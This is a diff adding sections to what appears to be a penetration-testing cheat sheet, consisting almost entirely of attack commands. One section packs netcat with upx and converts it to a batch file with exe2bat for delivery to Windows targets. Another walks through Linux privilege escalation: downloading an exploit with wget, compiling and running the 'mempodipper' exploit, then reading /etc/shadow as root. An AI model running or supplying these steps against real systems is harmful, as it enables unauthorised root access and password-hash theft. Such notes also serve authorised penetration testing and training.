@@ -70,3 +70,24 @@ run
 use recon/hosts/gather/http/web/ip_neighbor     # Search for neighbouring IP addresses
 set COMPANY <target>
 run
+------------------------------------------------------------------------------------------------------
+
+# debug.exe
+
+cp /usr/share/windows-binaries/nc.exe /root/
+cp /usr/share/windows-binaries/exe2bat.exe /root/
+upx -9 nc.exe
+wine exe2bat.exe nc.exe nc.txt
+------------------------------------------------------------------------------------------------------
+
+# Local Privilege Escalation - Linux
+
+ssh user@<target IP>
+id                                              # verify user permissions
+cat /etc/shadow                                 # access denied
+wget -O exploit.c http://www.exploit5db.com/download/18411
+gcc -o mempodipper exploit.c                    # compile exploit
+./mempodipper                                   # run exploit
+id                                              # verify root permissions
+cat /etc/shadow
+------------------------------------------------------------------------------------------------------
